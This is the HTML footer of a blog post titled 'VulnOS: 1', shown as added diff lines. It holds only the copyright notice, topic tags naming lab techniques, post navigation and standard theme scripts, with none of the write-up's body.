+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/05/28/VulnOS%201/" title="VulnOS: 1">https://z9m8r8.github.io/2024/05/28/VulnOS 1/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/CGI/" rel="tag"><i class="fa fa-tag"></i> CGI</a>
+              <a href="/tags/phpmyadmin/" rel="tag"><i class="fa fa-tag"></i> phpmyadmin</a>
+              <a href="/tags/drupal6/" rel="tag"><i class="fa fa-tag"></i> drupal6</a>
+              <a href="/tags/Dirty-COW/" rel="tag"><i class="fa fa-tag"></i> Dirty COW</a>
+              <a href="/tags/MySQL/" rel="tag"><i class="fa fa-tag"></i> MySQL</a>
+              <a href="/tags/webmin/" rel="tag"><i class="fa fa-tag"></i> webmin</a>
+              <a href="/tags/distccd/" rel="tag"><i class="fa fa-tag"></i> distccd</a>
+              <a href="/tags/htpasswd/" rel="tag"><i class="fa fa-tag"></i> htpasswd</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/05/25/digitalworld.local%20FALL/" rel="prev" title="digitalworld.local: FALL">
+                  <i class="fa fa-angle-left"></i> digitalworld.local: FALL
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">232k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">14:05</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/05/28/VulnOS%201/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
